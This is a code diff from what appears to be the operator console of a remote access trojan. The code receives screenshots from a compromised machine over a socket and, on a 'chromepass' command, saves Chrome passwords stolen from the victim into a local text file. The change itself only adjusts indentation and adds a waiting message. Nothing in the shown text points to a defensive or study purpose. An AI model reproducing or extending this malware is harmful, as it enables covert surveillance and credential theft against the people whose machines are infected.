@@ -31,11 +31,12 @@ if(s.recv(BUFFER_SIZE).decode()) == "auth":
                     os.makedirs('screenshots')
                 with open(f"./screenshots/{filename}", 'wb') as f:
                     f.write(imgdata) 
-            elif cmd.lower() == "chromepass":    
-                   chromepass = s.recv(BUFFER_SIZE).decode()
-                   if chromepass != "null":
-                        with open("chromepass.txt","a+") as f:
-                                f.write(chromepass)
+            elif cmd.lower() == "chromepass":   
+                print("Please wait...\n") 
+                chromepass = s.recv(BUFFER_SIZE).decode()
+                if chromepass != "null":
+                    with open("chromepass.txt","a+") as f:
+                            f.write(chromepass)
             output = s.recv(BUFFER_SIZE).decode()
             cwd = output.split(SEPARATOR)[0]
             if output.split(SEPARATOR)[1] == "exiting...":
